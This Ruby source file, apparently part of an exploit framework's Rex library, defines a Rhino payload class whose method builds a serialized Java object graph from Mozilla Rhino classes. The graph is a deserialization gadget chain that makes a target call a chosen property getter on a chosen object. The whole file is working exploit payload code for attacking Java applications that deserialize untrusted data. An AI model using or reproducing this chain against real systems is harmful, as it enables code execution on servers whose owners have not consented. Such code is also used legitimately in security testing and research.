# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Rhino
          def self.make_get_property(obj, prop)
            top = Model::JavaObject.new('Lorg/mozilla/javascript/NativeObject;', 
                                        'associatedValues' => Model::JavaObject.new('Ljava/util/HashMap;', 
                                                                                    'elements' => {
                                          'ClassCache' => Model::JavaObject.new('Lorg/mozilla/javascript/ClassCache;', {})
                                        }))


            getter = Model::JavaObject.new('Lorg/mozilla/javascript/MemberBox;',
                                           'isMethod' => true,
                                           'name' => 'enter',
                                           'class' => Model::JavaClass.new('Lorg/mozilla/javascript/Context;'),
                                           'params' => [])

            initscriptable = Model::JavaObject.new('Lorg/mozilla/javascript/tools/shell/Environment;', 
                                                   'slots' =>  [
                                                     Model::JavaObject.new('Lorg/mozilla/javascript/ScriptableObject$GetterSlot;', 
                                                                           'indexOrHash' => 0,
                                                                           'name' => 'foo',
                                                                           'getter' => getter)])

            initcontext = Model::JavaObject.new('Lorg/mozilla/javascript/NativeJavaObject;', 
                                                'isAdapter' => true,
                                                'parent' => top,
                                                'scriptable' => initscriptable)

            invokescript = Model::JavaObject.new('Lorg/mozilla/javascript/tools/shell/Environment;', 
                                                 'parentScopeObject' => initcontext,
                                                 'slots' => [
                                                   Model::JavaObject.new('Lorg/mozilla/javascript/ScriptableObject$GetterSlot;', 
                                                                         'indexOrHash' => 0,
                                                                         'name' => prop)
                                                 ])

            array = Model::JavaObject.new('Lorg/mozilla/javascript/NativeJavaArray;',
                                          'parent' => top,
                                          'javaObject' => obj,
                                          'prototype' => invokescript)

            Model::JavaObject.new('Lorg/mozilla/javascript/NativeJavaObject;', 
                                  'isAdapter' => true,
                                  'parent' => top,
                                  'scriptable' => array)
          end
        end
      end
    end
  end
end
